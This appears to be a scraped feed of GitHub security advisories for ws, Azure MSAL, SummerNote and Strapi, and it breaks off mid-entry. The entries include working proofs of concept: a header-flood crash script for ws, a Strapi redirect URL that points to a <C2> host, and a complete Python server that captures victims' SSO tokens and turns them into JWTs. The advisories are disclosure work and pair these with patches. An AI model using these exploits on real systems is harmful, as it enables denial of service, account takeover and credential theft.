<pre><code class="language-js">const http = require('http');
const WebSocket = require('ws');

const wss = new WebSocket.Server({ port: 0 }, function () {
  const chars = "!#$%&amp;'*+-.0123456789abcdefghijklmnopqrstuvwxyz^_`|~".split('');
  const headers = {};
  let count = 0;

  for (let i = 0; i &lt; chars.length; i++) {
    if (count === 2000) break;

    for (let j = 0; j &lt; chars.length; j++) {
      const key = chars[i] + chars[j];
      headers[key] = 'x';

      if (++count === 2000) break;
    }
  }

  headers.Connection = 'Upgrade';
  headers.Upgrade = 'websocket';
  headers['Sec-WebSocket-Key'] = 'dGhlIHNhbXBsZSBub25jZQ==';
  headers['Sec-WebSocket-Version'] = '13';

  const request = http.request({
    headers: headers,
    host: '127.0.0.1',
    port: wss.address().port
  });

  request.end();
});
</code></pre>
<h3 id="patches">Patches</h3>
<p>The vulnerability was fixed in <a href="mailto:ws@8.17.1">ws@8.17.1</a> (<a href="https://github.com/websockets/ws/commit/e55e5106f10fcbaac37cfa89759e4cc0d073a52c">https://github.com/websockets/ws/commit/e55e5106f10fcbaac37cfa89759e4cc0d073a52c</a>) and backported to <a href="mailto:ws@7.5.10">ws@7.5.10</a> (<a href="https://github.com/websockets/ws/commit/22c28763234aa75a7e1b76f5c01c181260d7917f">https://github.com/websockets/ws/commit/22c28763234aa75a7e1b76f5c01c181260d7917f</a>), <a href="mailto:ws@6.2.3">ws@6.2.3</a> (<a href="https://github.com/websockets/ws/commit/eeb76d313e2a00dd5247ca3597bba7877d064a63">https://github.com/websockets/ws/commit/eeb76d313e2a00dd5247ca3597bba7877d064a63</a>), and <a href="mailto:ws@5.2.4">ws@5.2.4</a> (<a href="https://github.com/websockets/ws/commit/4abd8f6de4b0b65ef80b3ff081989479ed93377e">https://github.com/websockets/ws/commit/4abd8f6de4b0b65ef80b3ff081989479ed93377e</a>)</p>
<h3 id="workarounds">Workarounds</h3>
<p>In vulnerable versions of ws, the issue can be mitigated in the following ways:</p>
<ol>
<li>Reduce the maximum allowed length of the request headers using the <a href="https://nodejs.org/api/cli.html#--max-http-header-sizesize"><code>--max-http-header-size=size</code></a> and/or the <a href="https://nodejs.org/api/http.html#httpcreateserveroptions-requestlistener"><code>maxHeaderSize</code></a> options so that no more headers than the <code>server.maxHeadersCount</code> limit can be sent.</li>
<li>Set <code>server.maxHeadersCount</code> to <code>0</code> so that no limit is applied.</li>
</ol>
<h3 id="credits">Credits</h3>
<p>The vulnerability was reported by <a href="https://github.com/rrlapointe">Ryan LaPointe</a> in <a href="https://github.com/websockets/ws/issues/2230">https://github.com/websockets/ws/issues/2230</a>.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/websockets/ws/issues/2230">https://github.com/websockets/ws/issues/2230</a></li>
<li><a href="https://github.com/websockets/ws/pull/2231">https://github.com/websockets/ws/pull/2231</a></li>
</ul>
<h3 id="references-1">References</h3>
<ul>
<li><a href="https://github.com/websockets/ws/security/advisories/GHSA-3h5v-q93c-6h6q">https://github.com/websockets/ws/security/advisories/GHSA-3h5v-q93c-6h6q</a></li>
<li><a href="https://github.com/websockets/ws/issues/2230">https://github.com/websockets/ws/issues/2230</a></li>
<li><a href="https://github.com/websockets/ws/pull/2231">https://github.com/websockets/ws/pull/2231</a></li>
<li><a href="https://github.com/websockets/ws/commit/22c28763234aa75a7e1b76f5c01c181260d7917f">https://github.com/websockets/ws/commit/22c28763234aa75a7e1b76f5c01c181260d7917f</a></li>
<li><a href="https://github.com/websockets/ws/commit/4abd8f6de4b0b65ef80b3ff081989479ed93377e">https://github.com/websockets/ws/commit/4abd8f6de4b0b65ef80b3ff081989479ed93377e</a></li>
<li><a href="https://github.com/websockets/ws/commit/e55e5106f10fcbaac37cfa89759e4cc0d073a52c">https://github.com/websockets/ws/commit/e55e5106f10fcbaac37cfa89759e4cc0d073a52c</a></li>
<li><a href="https://github.com/websockets/ws/commit/eeb76d313e2a00dd5247ca3597bba7877d064a63">https://github.com/websockets/ws/commit/eeb76d313e2a00dd5247ca3597bba7877d064a63</a></li>
<li><a href="https://github.com/advisories/GHSA-3h5v-q93c-6h6q">https://github.com/advisories/GHSA-3h5v-q93c-6h6q</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-3h5v-q93c-6h6q</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2024-06-17T19:09:10.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[@azure/msal-node] Azure Identity Libraries and Microsoft Authentication Library Elevation of Privilege Vulnerability]]></title>
        <id>https://github.com/advisories/GHSA-m5vv-6r4h-3vj9</id>
        <link href="https://github.com/advisories/GHSA-m5vv-6r4h-3vj9"/>
        <updated>2024-06-13T18:44:18.000Z</updated>
        <content type="html"><![CDATA[<p>Azure Identity Libraries and Microsoft Authentication Library Elevation of Privilege Vulnerability.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-35255">https://nvd.nist.gov/vuln/detail/CVE-2024-35255</a></li>
<li><a href="https://msrc.microsoft.com/update-guide/vulnerability/CVE-2024-35255">https://msrc.microsoft.com/update-guide/vulnerability/CVE-2024-35255</a></li>
<li><a href="https://github.com/Azure/azure-sdk-for-go/commit/50774cd9709905523136fb05e8c85a50e8984499">https://github.com/Azure/azure-sdk-for-go/commit/50774cd9709905523136fb05e8c85a50e8984499</a></li>
<li><a href="https://github.com/Azure/azure-sdk-for-js/commit/c6aa75d312ae463e744163cedfd8fc480cc8d492">https://github.com/Azure/azure-sdk-for-js/commit/c6aa75d312ae463e744163cedfd8fc480cc8d492</a></li>
<li><a href="https://github.com/Azure/azure-sdk-for-python/commit/cb065acd7d0f957327dc4f02d1646d4e51a94178">https://github.com/Azure/azure-sdk-for-python/commit/cb065acd7d0f957327dc4f02d1646d4e51a94178</a></li>
<li><a href="https://github.com/Azure/azure-sdk-for-java/commit/5bf020d6ea056de40e2738e3647a4e06f902c18d">https://github.com/Azure/azure-sdk-for-java/commit/5bf020d6ea056de40e2738e3647a4e06f902c18d</a></li>
<li><a href="https://github.com/Azure/azure-sdk-for-net/commit/9279a4f38bf69b457cfb9b354f210e0a540a5c53">https://github.com/Azure/azure-sdk-for-net/commit/9279a4f38bf69b457cfb9b354f210e0a540a5c53</a></li>
<li><a href="https://github.com/advisories/GHSA-m5vv-6r4h-3vj9">https://github.com/advisories/GHSA-m5vv-6r4h-3vj9</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-m5vv-6r4h-3vj9</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2024-06-11T18:30:50.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[summernote] SummerNote Cross Site Scripting Vulnerability]]></title>
        <id>https://github.com/advisories/GHSA-cc55-mvqc-g9mg</id>
        <link href="https://github.com/advisories/GHSA-cc55-mvqc-g9mg"/>
        <updated>2024-06-12T19:45:07.000Z</updated>
        <content type="html"><![CDATA[<p>SummerNote 0.8.18 is vulnerable to Cross Site Scripting (XSS) via the Code View Function.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-37629">https://nvd.nist.gov/vuln/detail/CVE-2024-37629</a></li>
<li><a href="https://github.com/summernote/summernote/issues/4642">https://github.com/summernote/summernote/issues/4642</a></li>
<li><a href="https://grumpz.net/cve-2024-37629-simple-xss-payload-exploits-0day-vulnerability-in-10000-web-apps">https://grumpz.net/cve-2024-37629-simple-xss-payload-exploits-0day-vulnerability-in-10000-web-apps</a></li>
<li><a href="https://github.com/advisories/GHSA-cc55-mvqc-g9mg">https://github.com/advisories/GHSA-cc55-mvqc-g9mg</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-cc55-mvqc-g9mg</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2024-06-12T18:30:41.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[@strapi/plugin-users-permissions] @strapi/plugin-users-permissions leaks 3rd party authentication tokens and authentication bypass]]></title>
        <id>https://github.com/advisories/GHSA-wrvh-rcmr-9qfc</id>
        <link href="https://github.com/advisories/GHSA-wrvh-rcmr-9qfc"/>
        <updated>2024-06-12T19:39:13.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>By combining two vulnerabilities (an <code>Open Redirect</code> and <code>session token sent as URL query parameter</code>) in Strapi framework is its possible of an unauthenticated attacker to bypass authentication mechanisms and retrieve the 3rd party tokens. The attack requires user interaction (one click).</p>
<h3 id="impact">Impact</h3>
<p>Unauthenticated attackers can leverage two vulnerabilities to obtain an 3rd party token and the bypass authentication of Strapi apps.</p>
<h3 id="technical-details">Technical details</h3>
<h4 id="vulnerability-1-open-redirect">Vulnerability 1: Open Redirect</h4>
<h5 id="description">Description</h5>
<p>Open redirection vulnerabilities arise when an application incorporates user-controllable data into the target of a redirection in an unsafe way. An attacker can construct a URL within the application that causes a redirection to an arbitrary external domain.</p>
<p>In the specific context of Strapi, this vulnerability allows the SSO token to be stolen, allowing an attacker to authenticate himself within the application.</p>
<h5 id="remediation">Remediation</h5>
<p>If possible, applications should avoid incorporating user-controllable data into redirection targets. In many cases, this behavior can be avoided in two ways:</p>
<ul>
<li>Remove the redirection function from the application, and replace links to it with direct links to the relevant target URLs.</li>
<li>Maintain a server-side list of all URLs that are permitted for redirection. Instead of passing the target URL as a parameter to the redirector, pass an index into this list.</li>
</ul>
<p>If it is considered unavoidable for the redirection function to receive user-controllable input and incorporate this into the redirection target, one of the following measures should be used to minimize the risk of redirection attacks:</p>
<ul>
<li>The application should use relative URLs in all of its redirects, and the redirection function should strictly validate that the URL received is a relative URL.</li>
<li>The application should use URLs relative to the web root for all of its redirects, and the redirection function should validate that the URL received starts with a slash character. It should then prepend <span dir=""><a href="http://yourdomainname.com">http://yourdomainname.com</a></span> to the URL before issuing the redirect.</li>
</ul>
<h6 id="example-1-open-redirect-in-apiconnectmicrosoft-via-_getcallback">Example 1: Open Redirect in <span dir="">/api/connect/microsoft</span> via <code>$_GET["callback"]</code></h6>
<ul>
<li>Path: <span dir="">/api/connect/microsoft</span></li>
<li>Parameter: <code>$_GET["callback"]</code></li>
</ul>
<p>Payload:</p>
<pre><code class="language-plaintext">https://google.fr/
</code></pre>
<p>Final payload:</p>
<pre><code class="language-plaintext">https://&lt;TARGET&gt;/api/connect/microsoft?callback=https://google.fr/
</code></pre>
<p>User clicks on the link:
<img alt="c1" src="https://github.com/strapi/strapi/assets/30262080/c1944cf8-2ef0-4214-ba9e-d4aad10d85ba"></p>
<p>Look at the intercepted request in Burp and see the redirect to Microsoft:</p>
<p><img alt="c0" src="https://github.com/strapi/strapi/assets/30262080/0c3d9289-432c-46ac-a7e3-eafe15f02483"></p>
<p>Microsoft check the cookies and redirects to the original domain (and route) but with different GET parameters.</p>
<p>Then, the page redirects to the domain controlled by the attacker (and a token is added to controlled the URL):</p>
<p><img alt="c2" src="https://github.com/strapi/strapi/assets/30262080/009e3898-1ccf-4ee4-9c29-496ff6b302d0"></p>
<p>The domain originally specified (<a href="https://google.fr">https://google.fr</a>) as <code>$_GET["callback"]</code> parameter is present in the cookies. So <span dir="">&lt;TARGET&gt;</span> is using the cookies (<code>koa.sess</code>) to redirect.</p>
<p><img alt="c3" src="https://github.com/strapi/strapi/assets/30262080/4c25cb6c-c9e8-4c2d-aa61-1ad1442e5f4d"></p>
<p><code>koa.sess</code> cookie:</p>
<pre><code class="language-base64">eyJncmFudCI6eyJwcm92aWRlciI6Im1pY3Jvc29mdCIsImR5bmFtaWMiOnsiY2FsbGJhY2siOiJodHRwczovL2dvb2dsZS5mci8ifX0sIl9leHBpcmUiOjE3MDAyMzQyNDQyNjMsIl9tYXhBZ2UiOjg2NDAwMDAwfQ==
</code></pre>
<pre><code class="language-json">{"grant":{"provider":"microsoft","dynamic":{"callback":"https://google.fr/"}},"_expire":1700234244263,"_maxAge":86400000}
</code></pre>
<p>The vulnerability seems to come from the application's core:</p>
<p>File: <a href="https://github.com/strapi/strapi/blob/develop/packages/plugins/users-permissions/server/controllers/auth.js"><span dir="">packages/plugins/users-permissions/server/controllers/auth.js</span></a></p>
<pre><code class="language-js">'use strict';

/**
 * Auth.js controller
 *
 * @description: A set of functions called "actions" for managing `Auth`.
 */

/* eslint-disable no-useless-escape */
const crypto = require('crypto');
const _ = require('lodash');
const { concat, compact, isArray } = require('lodash/fp');
const utils = require('@strapi/utils');
const {
  contentTypes: { getNonWritableAttributes },
} = require('@strapi/utils');
const { getService } = require('../utils');
const {
  validateCallbackBody,
  validateRegisterBody,
  validateSendEmailConfirmationBody,
  validateForgotPasswordBody,
  validateResetPasswordBody,
  validateEmailConfirmationBody,
  validateChangePasswordBody,
} = require('./validation/auth');

const { getAbsoluteAdminUrl, getAbsoluteServerUrl, sanitize } = utils;
const { ApplicationError, ValidationError, ForbiddenError } = utils.errors;

const sanitizeUser = (user, ctx) =&gt; {
  const { auth } = ctx.state;
  const userSchema = strapi.getModel('plugin::users-permissions.user');

  return sanitize.contentAPI.output(user, userSchema, { auth });
};

module.exports = {
  async callback(ctx) {
    const provider = ctx.params.provider || 'local';
    const params = ctx.request.body;

    const store = strapi.store({ type: 'plugin', name: 'users-permissions' });
    const grantSettings = await store.get({ key: 'grant' });

    const grantProvider = provider === 'local' ? 'email' : provider;

    if (!_.get(grantSettings, [grantProvider, 'enabled'])) {
      throw new ApplicationError('This provider is disabled');
    }

    if (provider === 'local') {
      await validateCallbackBody(params);

      const { identifier } = params;

      // Check if the user exists.
      const user = await strapi.query('plugin::users-permissions.user').findOne({
        where: {
          provider,
          $or: [{ email: identifier.toLowerCase() }, { username: identifier }],
        },
      });

      if (!user) {
        throw new ValidationError('Invalid identifier or password');
      }

      if (!user.password) {
        throw new ValidationError('Invalid identifier or password');
      }

      const validPassword = await getService('user').validatePassword(
        params.password,
        user.password
      );

      if (!validPassword) {
        throw new ValidationError('Invalid identifier or password');
      }

      const advancedSettings = await store.get({ key: 'advanced' });
      const requiresConfirmation = _.get(advancedSettings, 'email_confirmation');

      if (requiresConfirmation &amp;&amp; user.confirmed !== true) {
        throw new ApplicationError('Your account email is not confirmed');
      }

      if (user.blocked === true) {
        throw new ApplicationError('Your account has been blocked by an administrator');
      }

      return ctx.send({
        jwt: getService('jwt').issue({ id: user.id }),
        user: await sanitizeUser(user, ctx),
      });
    }

    // Connect the user with the third-party provider.
    try {
      const user = await getService('providers').connect(provider, ctx.query);

      if (user.blocked) {
        throw new ForbiddenError('Your account has been blocked by an administrator');
      }

      return ctx.send({
        jwt: getService('jwt').issue({ id: user.id }),
        user: await sanitizeUser(user, ctx),
      });
    } catch (error) {
      throw new ApplicationError(error.message);
    }
  },

  //...

  async connect(ctx, next) {
    const grant = require('grant-koa');

    const providers = await strapi
      .store({ type: 'plugin', name: 'users-permissions', key: 'grant' })
      .get();

    const apiPrefix = strapi.config.get('api.rest.prefix');
    const grantConfig = {
      defaults: {
        prefix: `${apiPrefix}/connect`,
      },
      ...providers,
    };

    const [requestPath] = ctx.request.url.split('?');
    const provider = requestPath.split('/connect/')[1].split('/')[0];

    if (!_.get(grantConfig[provider], 'enabled')) {
      throw new ApplicationError('This provider is disabled');
    }

    if (!strapi.config.server.url.startsWith('http')) {
      strapi.log.warn(
        'You are using a third party provider for login. Make sure to set an absolute url in config/server.js. More info here: https://docs.strapi.io/developer-docs/latest/plugins/users-permissions.html#setting-up-the-server-url'
      );
    }

    // Ability to pass OAuth callback dynamically
    grantConfig[provider].callback =
      _.get(ctx, 'query.callback') ||
      _.get(ctx, 'session.grant.dynamic.callback') ||
      grantConfig[provider].callback;
    grantConfig[provider].redirect_uri = getService('providers').buildRedirectUri(provider);

    return grant(grantConfig)(ctx, next);
  },

  //...

};
</code></pre>
<p>And more specifically:</p>
<pre><code class="language-js">...

    // Ability to pass OAuth callback dynamically
    grantConfig[provider].callback =
      _.get(ctx, 'query.callback') ||
      _.get(ctx, 'session.grant.dynamic.callback') ||
      grantConfig[provider].callback;
    grantConfig[provider].redirect_uri = getService('providers').buildRedirectUri(provider);

    return grant(grantConfig)(ctx, next);
...
</code></pre>
<p>Possible patch:</p>
<pre><code class="language-js">grantConfig[provider].callback = process.env[`${provider.toUpperCase()}_REDIRECT_URL`] || grantConfig[provider].callback
</code></pre>
<p><code>_.get(ctx, 'query.callback')</code> = <code>$_GET["callback"]</code> and <code>_.get(ctx, 'session')</code> = <code>$_COOKIE["koa.sess"]</code> (which is <code>{"grant":{"provider":"microsoft","dynamic":{"callback":"https://XXXXXXX/"}},"_expire":1701275652123,"_maxAge":86400000}</code>) so <code>_.get(ctx, 'session.grant.dynamic.callback')</code> = <code>https://XXXXXXX/</code>.</p>
<p>The route is clearly defined here:</p>
<p>File: <a href="https://github.com/strapi/strapi/blob/develop/packages/plugins/users-permissions/server/routes/content-api/auth.js"><span dir="">packages/plugins/users-permissions/server/routes/content-api/auth.js</span></a></p>
<pre><code class="language-js">'use strict';

module.exports = [

//...

  {
    method: 'GET',
    path: '/auth/:provider/callback',
    handler: 'auth.callback',
    config: {
      prefix: '',
    },
  },

  //...

];
</code></pre>
<p>File: <a href="https://github.com/strapi/strapi/blob/develop/packages/plugins/users-permissions/server/services/providers-registry.js"><span dir="">packages/plugins/users-permissions/server/services/providers-registry.js</span></a></p>
<pre><code class="language-js">
const getInitialProviders = ({ purest }) =&gt; ({

//..

  async microsoft({ accessToken }) {
    const microsoft = purest({ provider: 'microsoft' });

    return microsoft
      .get('me')
      .auth(accessToken)
      .request()
      .then(({ body }) =&gt; ({
        username: body.userPrincipalName,
        email: body.userPrincipalName,
      }));
  },

//..

});
</code></pre>
<p>If parameter <code>$_GET["callback"]</code> is defined in the GET request, the assignment does not evaluate all conditions, but stops at the beginning. The value is then stored in the cookie <code>koa.sess</code>:</p>
<p><code>koa.sess</code>=<code>eyJncmFudCI6eyJwcm92aWRlciI6Im1pY3Jvc29mdCIsImR5bmFtaWMiOnsiY2FsbGJhY2siOiJodHRwczovL2FkbWluLmludGUubmV0YXRtby5jb20vdXNlcnMvYXV0aC9yZWRpcmVjdCJ9fSwiX2V4cGlyZSI6MTcwMTI3NTY1MjEyMywiX21heEFnZSI6ODY0MDAwMDB9</code></p>
<p>Which once base64 decoded become <code>{"grant":{"provider":"microsoft","dynamic":{"callback":"https://&lt;TARGET&gt;/users/auth/redirect"}},"_expire":1701275652123,"_maxAge":86400000}</code>.</p>
<p>The signature of the cookie is stored in cookie <code>koa.sess.sig</code>:</p>
<p><code>koa.sess.sig</code>=<code>wTRmcVRrn88hWMdg84VvSD87-_0</code></p>
<p>File: <a href="https://github.com/strapi/strapi/blob/develop/packages/plugins/users-permissions/server/bootstrap/grant-config.js"><span dir="">packages/plugins/users-permissions/server/bootstrap/grant-config.js</span></a></p>
<pre><code class="language-js">
//..

  microsoft: {
    enabled: false,
    icon: 'windows',
    key: '',
    secret: '',
    callback: `${baseURL}/microsoft/callback`,
    scope: ['user.read'],
  },

//..
</code></pre>
<h4 id="vulnerability-2-session-token-in-url">Vulnerability 2: Session token in URL</h4>
<h5 id="description-1">Description</h5>
<p>Applications should not send session tokens as URL query parameters and use instead an alternative mechanism for transmitting session tokens, such as HTTP cookies or hidden fields in forms that are submitted using the POST method.</p>
<h6 id="example-1-sso-token-transmitted-within-url-_getaccess_token">Example 1: SSO token transmitted within URL (<code>$_GET["access_token"]</code>)</h6>
<ul>
<li>Path: <span dir="">/api/connect/microsoft</span></li>
<li>Parameter: <code>$_GET["callback"]</code></li>
</ul>
<p>When a callback was called, the 3rd party token was transmitted in an insecure way within the URL, which could be used to increase the impact of the Open Redirect vulnerability described previously by stealing the SSO token.</p>
<p>Weaponized payload:</p>
<pre><code class="language-plaintext">https://&lt;TARGET&gt;/api/connect/microsoft?callback=http://&lt;C2&gt;:8080/
</code></pre>
<p>With a web server specially developed to exploit the vulnerability listening on <span dir="">&lt;C2&gt;:8080</span>,  it is possible to retrieve a JWT token allowing authentication on Strapi.</p>
<p>A user is on his browser when he decides to click on a link sent to him by e-mail.</p>
<p><img alt="c4" src="https://github.com/strapi/strapi/assets/30262080/c6e22fa1-14a4-4c76-a832-d07305f265b6"></p>
<blockquote>
<p>The attacker places the malicious link in the URL bar to simulate a victim's click.</p>
</blockquote>
<p><img alt="c5" src="https://github.com/strapi/strapi/assets/30262080/4da28c5b-6501-4f93-9041-9917a2b070e6"></p>
<p>The server specially developed by the attacker to show that the vulnerability is exploitable, recovers the user's SSO token.</p>
<blockquote>
<p>Everything is invisible to the victim.</p>
</blockquote>
<p><img alt="c6" src="https://github.com/strapi/strapi/assets/30262080/58db0a31-3b3b-4648-958b-953eba88bf87"></p>
<p>Because the victim didn't change to another Web page.</p>
<p><img alt="c7" src="https://github.com/strapi/strapi/assets/30262080/ab4dd6f9-02e1-42c9-9142-434db865f0d3"></p>
<p>The attacker can use the SSO token to authenticate himself within the application and retrieve a valid JWT token enabling him to interact with it.</p>
<p><img alt="c8" src="https://github.com/strapi/strapi/assets/30262080/aab8d22f-5f0e-4a67-85a8-2e333df9b84b"></p>
<h5 id="details">Details</h5>
<h6 id="get-the-jwt-token-with-the-access_token">Get the JWT token with the <code>access_token</code></h6>
<p>First of all, thanks to the SSO token, you authenticate yourself and get a JWT token to be able to interact with the various API routes.</p>
<p>Request (HTTP):</p>
<pre><code class="language-http">GET /api/auth/microsoft/callback?access_token=eyJ0eXAiOiJKV&lt;REDACTED&gt;yBzA HTTP/1.1
Host: &lt;TARGET&gt;
</code></pre>
<p>Response (HTTP):</p>
<pre><code class="language-http">HTTP/1.1 200 OK
Server: nginx
Date: Mon, 27 Nov 2023 17:58:46 GMT
Content-Type: application/json; charset=utf-8
Content-Length: 411
Connection: keep-alive
Content-Security-Policy: connect-src 'self' https:;img-src 'self' data: blob: https://market-assets.strapi.io;media-src 'self' data: blob:;default-src 'self';base-uri 'self';font-src 'self' https: data:;form-action 'self';frame-ancestors 'self';object-src 'none';script-src 'self';script-src-attr 'none';style-src 'self' https: 'unsafe-inline'
Referrer-Policy: no-referrer
Strict-Transport-Security: max-age=31536000; includeSubDomains
X-Content-Type-Options: nosniff
X-DNS-Prefetch-Control: off
X-Download-Options: noopen
X-Frame-Options: SAMEORIGIN
X-Permitted-Cross-Domain-Policies: none
Vary: Origin
X-XSS-Protection: 1; mode=block
Strict-Transport-Security: max-age=31536000; includeSubDomains
X-Powered-By: &lt;REDACTED&gt;

{"jwt":"eyJhbG&lt;REDACTED&gt;eCac","user":{"id":111,"username":"&lt;REDACTED&gt;@&lt;REDACTED&gt;-ext.com","email":"&lt;redacted&gt;@&lt;redacted&gt;-ext.com","provider":"microsoft","confirmed":true,"blocked":false,"createdAt":"2023-11-14T12:35:42.440Z","updatedAt":"2023-11-16T21:00:19.241Z","is_external":false}}
</code></pre>
<h6 id="request-api-routes-using-the-jwt-token">Request API routes using the JWT token</h6>
<p>Then reuse the JWT token to request the API.</p>
<p>Request (HTTP):</p>
<pre><code class="language-http">GET /api/users/me/groups?app=support HTTP/1.1
Host: &lt;TARGET&gt;
Authorization: Bearer eyJ&lt;REDACTED&gt;EeCac
</code></pre>
<p>Response (HTTP):</p>
<pre><code class="language-http">HTTP/1.1 200 OK
Server: nginx
Date: Tue, 28 Nov 2023 13:45:42 GMT
Content-Type: application/json; charset=utf-8
Content-Length: 24684
Connection: keep-alive
Content-Security-Policy: connect-src 'self' https:;img-src 'self' data: blob: https://market-assets.strapi.io;media-src 'self' data: blob:;default-src 'self';base-uri 'self';font-src 'self' https: data:;form-action 'self';frame-ancestors 'self';object-src 'none';script-src 'self';script-src-attr 'none';style-src 'self' https: 'unsafe-inline'
Referrer-Policy: no-referrer
Strict-Transport-Security: max-age=31536000; includeSubDomains
X-Content-Type-Options: nosniff
X-DNS-Prefetch-Control: off
X-Download-Options: noopen
X-Frame-Options: SAMEORIGIN
X-Permitted-Cross-Domain-Policies: none
Vary: Origin
X-RateLimit-Limit: 10
X-RateLimit-Remaining: 9
X-RateLimit-Reset: 1701179203
X-XSS-Protection: 1; mode=block
Strict-Transport-Security: max-age=31536000; includeSubDomains
X-Powered-By: &lt;REDACTED&gt;

{"apps":{"support":{"groups":[{"device_whitelist":null,"name":"test - support","id":10,"group_privileges":[{"id":37,&lt;REDACTED&gt;

...
</code></pre>
<h3 id="poc-web-server-stealing-sso-token-and-retrieving-jwt-token-then-bypassing-authentication">POC (Web server stealing SSO token and retrieving JWT token then bypassing authentication)</h3>
<pre><code class="language-python">import base64
import json
import urllib.parse

from http.server import BaseHTTPRequestHandler, HTTPServer
from sys import argv


# Strapi URL.
TARGET = "target.com"

# URLs to which victims are automatically redirected.
REDIRECT_URL = [
    "strapi.io",
    "www.google.fr"
]
# URL used to generate a valid JWT token for authentication within the
# application.
GEN_JWT_URL = f"https://{TARGET}/api/auth/microsoft/callback"


# This function is used to generate a curl command which once executed, will
# give us a valid JWT connection token.
def generate_curl_command(token):
    command = f"curl '{GEN_JWT_URL}?access_token={token}'"
    return command


# We create a custom HTTP server to retrieve users' SSO tokens.
class CustomServer(BaseHTTPRequestHandler):

    # Here we override the default logging function to reduce verbosity.
    def log_message(self, format, *args):
        pass

    # This function automatically redirects a user to the page defined in the
    # global variable linked to the redirection.
    def _set_response(self):
        self.send_response(302)
        self.send_header("Location", REDIRECT_URL[0])
        self.end_headers()

    # If an SSO token is present, we parse it and log the result in STDOUT.
    def do_GET(self):
        # This condition checks whether a token is present in the URL.
        if str(self.path).find("access_token") != -1:
            # If this is the case, we recover the token.
            query = urllib.parse.urlparse(self.path).query
            query_components = dict(qc.split("=") for qc in query.split("&amp;"))
            access_token = urllib.parse.unquote(query_components["access_token"])

            # In the token, which is a string in JWT format, we retrieve the
            # body part of the token.
            interesting_data = access_token.split(".")[1]

            # Patching base64 encoded data.
            interesting_data = interesting_data + "=" * (-len(interesting_data) % 4)

            # Parsing JSON.
            json_data = json.loads(base64.b64decode(interesting_data.encode()))
            family_name, given_name, ipaddr, upn = json_data["given_name"], json_data["family_name"], json_data["ipaddr"], json_data["upn"]

            print(f"[+] Token captured for {family_name} {given_name}, {upn} ({ipaddr}):\n{access_token}\n")
            print(f"[*] Run: \"{generate_curl_command(query_components['access_token'])}\" to get JWT token")

        self._set_response()
        self.wfile.write("Redirecting ...".encode("utf-8"))


def run(server_class=HTTPServer, handler_class=CustomServer, ip="0.0.0.0", port=8080):
    server_address = (ip, port)
    httpd = server_class(server_address, handler_class)

    print(f"Starting httpd ({ip}:{port}) ...")
    try:
        httpd.serve_forever()
    except KeyboardInterrupt:
        pass

    httpd.server_close()
    print("Stopping httpd ...")


if __name__ == "__main__":
    if len(argv) == 3:
        run(ip=argv[1], port=int(argv[2]))
    else:
        run()
</code></pre>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/strapi/strapi/security/advisories/GHSA-wrvh-rcmr-9qfc">https://github.com/strapi/strapi/security/advisories/GHSA-wrvh-rcmr-9qfc</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-34065">https://nvd.nist.gov/vuln/detail/CVE-2024-34065</a></li>
<li><a href="https://github.com/strapi/strapi/commit/9c79921d22142a5de77ea26151550a14e4b12669">https://github.com/strapi/strapi/commit/9c79921d22142a5de77ea26151550a14e4b12669</a></li>
<li><a href="https://github.com/advisories/GHSA-wrvh-rcmr-9qfc">https://github.com/advisories/GHSA-wrvh-rcmr-9qfc</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-wrvh-rcmr-9qfc</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2024-06-12T19:39:11.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[@strapi/plugin-upload] @strapi/plugin-upload  has a Denial-of-Service via Improper Exception Handling]]></title>
        <id>https://github.com/advisories/GHSA-pm9q-xj9p-96pm</id>
        <link href="https://github.com/advisories/GHSA-pm9q-xj9p-96pm"/>
        <updated>2024-06-12T19:38:25.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>A Denial-of-Service was found in the media upload process causing the server to crash without restarting, affecting either development and production environments.</p>
<h3 id="details">Details</h3>
<p>Usually, errors in the application cause it to log the error and keep it running for other clients. This behavior, in contrast, stops the server execution, making it unavailable for any clients until it's manually restarted. </p>
<h3 id="poc">PoC</h3>
<p>Due to a bug in what we believe to be Burp’s decoding system, we couldn’t produce a valid file to easily reproduce the vulnerability. Instead, the issue can be reproduced by following these steps:</p>
<ol>
<li>Configure Burp’s proxy between a browser and a Strapi server</li>
<li>Log in and upload an image through the Media Library page while having Burp’s interceptor turned on</li>
<li>After capturing the upload POST request in Burp, add <code>%00</code> at the end of the file extension from the <code>Content-Disposition</code>, in the filename parameter (See reference image 1 below)</li>
<li>Using the cursor, select the added <code>%00</code> and right-click it. Click in Convert selection &gt; URL &gt; URL decode to transform the selected text into a null byte</li>
<li>Forward the modified request. The server should print an error and crash with the error <code>ERR_INVALID_ARG_VALUE</code> (See reference log 1 below)</li>
</ol>
<p>By following the data flow, we reached the <a href="https://github.com/strapi/strapi/blob/f1dd5cc8eef574bac6679aab6f93276e57497328/packages/providers/upload-local/src/index.ts#L86">line of code</a> where we believe the DoS is being caused.
The simpler way of fixing this vulnerability seems to be avoiding the error thrown by whitelisting the characters used in the extension.</p>
<h4 id="reference-image-1">Reference Image 1</h4>
